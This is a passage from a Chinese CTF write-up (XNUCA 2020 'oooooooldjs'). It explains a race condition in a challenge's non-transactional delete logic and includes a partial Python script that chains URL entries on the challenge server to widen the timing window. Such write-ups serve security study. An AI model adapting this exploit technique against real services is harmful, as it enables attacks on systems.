<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> middlewares = [</span><br><span class="line">	<span class="comment">// should be</span></span><br><span class="line">	body(<span class="string">&#x27;*&#x27;</span>).trim(),</span><br><span class="line">	body(<span class="string">&#x27;type&#x27;</span>).if(body(<span class="string">&#x27;type&#x27;</span>).exists()).bail().isIn([<span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;text&#x27;</span>])</span><br><span class="line">	.withMessage(<span class="string">&quot;type must be `url` or `text`&quot;</span>),</span><br><span class="line">	body(<span class="string">&#x27;block&#x27;</span>).if(body(<span class="string">&#x27;type&#x27;</span>).exists()).notEmpty()</span><br><span class="line">	.withMessage(<span class="string">&quot;no `block` content&quot;</span>).bail()</span><br><span class="line">	.if(body(<span class="string">&#x27;type&#x27;</span>).isIn([<span class="string">&#x27;url&#x27;</span>])).isURL(&#123;</span><br><span class="line">		<span class="attr">require_tld</span>: <span class="literal">false</span></span><br><span class="line">	&#125;)</span><br><span class="line">	.custom(<span class="function">(<span class="params">value, &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">		req</span></span></span><br><span class="line"><span class="params"><span class="function">	&#125;</span>) =&gt;</span> <span class="keyword">new</span> URL(value).host === host)</span><br><span class="line">	.withMessage(<span class="string">&quot;invalid url!&quot;</span>),</span><br><span class="line">	<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">		<span class="keyword">const</span> errors = validationResult(req)</span><br><span class="line">		<span class="keyword">if</span> (!errors.isEmpty()) &#123;</span><br><span class="line">			<span class="keyword">return</span> res.status(<span class="number">400</span>).json(&#123;</span><br><span class="line">				<span class="attr">errors</span>: errors.array()</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">		next()</span><br><span class="line">	&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<p>回到我们刚刚说的第二点有趣的地方，这个简单的数据库并不支持事务功能，也就是说删除type和data并不会同时删除是存在一定的时间差的，相关代码如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">D</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">		<span class="keyword">let</span> di, dt</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">const</span> index <span class="keyword">in</span> <span class="built_in">this</span>.datas) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">this</span>.datas[index].id === id) &#123;</span><br><span class="line">				dt = <span class="built_in">this</span>.types[index]</span><br><span class="line">				<span class="built_in">this</span>.types.splice(index, <span class="number">1</span>)</span><br><span class="line">				di = index</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (dt === <span class="string">&#x27;url&#x27;</span>) &#123;</span><br><span class="line">			requests(<span class="built_in">this</span>.datas[di].block, <span class="string">&quot;DELETE&quot;</span>).finally(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">				<span class="built_in">this</span>.datas = <span class="built_in">this</span>.datas.filter(<span class="function">(<span class="params">value</span>)=&gt;</span>value.id !== id)</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">this</span>.datas = <span class="built_in">this</span>.datas.filter(<span class="function">(<span class="params">value</span>)=&gt;</span>value.id !== id)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p>在删除了type后，他进行了一个相当耗时的操作：访问url，之后才删除data，又因为这里是一个链式删除，一个接着一个删除，所有type删除完后它可能才删除一个data</p>
<p>于是有：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">challenge = <span class="string">&quot;http://eci-2ze1whgyeh7v30y5j8yh.cloudeci1.ichunqiu.com:8888&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insertUrl</span>(<span class="params">url</span>):</span></span><br><span class="line">    burp0_url = challenge+<span class="string">&quot;/data&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;url&quot;</span>, <span class="string">&quot;block&quot;</span>: url&#125;</span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = requests.post(burp0_url, headers=burp0_headers, data=burp0_data).json()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insertData</span>(<span class="params">data</span>):</span></span><br><span class="line">    burp0_url = challenge+<span class="string">&quot;/data&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;text&quot;</span>, <span class="string">&quot;block&quot;</span>: data&#125;</span><br><span class="line">    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setLongLine</span>(<span class="params">length=<span class="number">2000</span></span>):</span></span><br><span class="line">    endId=<span class="string">&quot;&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://localhost:8888/data/fake-uuid&quot;</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; length:</span><br><span class="line">        count+=<span class="number">1</span></span><br><span class="line">        data = insertUrl(url)</span><br><span class="line">        url = <span class="string">&quot;http://localhost:8888/data/&quot;</span>+data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        endId = data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;id&quot;</span>]</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/11/12/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/" data-id="ckw7zwc030035fmol5komhfmv" data-title="XNUCA_2020_oooooooldjs题解" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/web/%E6%AF%94%E8%B5%9B/">比赛</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 12px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 16px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 12px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 12px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 18px;">web</a> <a href="/tags/wp/" style="font-size: 20px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 12px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 14px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 12px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 12px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/11/19/tp6%E6%96%B0pop%E9%93%BE/">tp6新pop链</a>
          </li>
        
          <li>
            <a href="/2021/11/18/TCTF2021_BuggyLoader/">buggyLoader</a>
          </li>
        
          <li>
            <a href="/2021/10/03/TSGCTF2021/">TSGCTF 2021</a>
          </li>
        
          <li>
            <a href="/2021/10/01/%E7%94%A8github%20action%20%E8%AE%A9hexo%E4%BD%93%E9%AA%8C++/">用github action 让hexo体验++</a>
          </li>
        
          <li>
            <a href="/2021/03/01/%E6%88%91%E7%9A%842020/">我的2020</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 ccreater<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>